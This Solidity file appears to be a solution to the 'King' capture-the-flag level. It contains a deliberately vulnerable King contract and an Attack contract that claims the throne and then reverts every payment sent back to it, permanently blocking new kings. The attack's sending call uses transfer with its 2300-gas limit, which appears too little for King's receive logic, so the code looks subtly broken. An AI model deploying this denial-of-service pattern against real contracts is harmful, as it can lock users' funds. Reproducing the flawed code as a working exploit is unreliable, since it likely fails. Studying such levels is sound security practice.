// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Attack {
  King public game;

  constructor(address payable _game) {
    game = King(_game);
  }

  function getKing() external payable {
    require(msg.value >= game.prize(), 'price not ok');
    payable(address(game)).transfer(msg.value);
  }

  receive() external payable {
    require(false, 'not out king');
  }
}
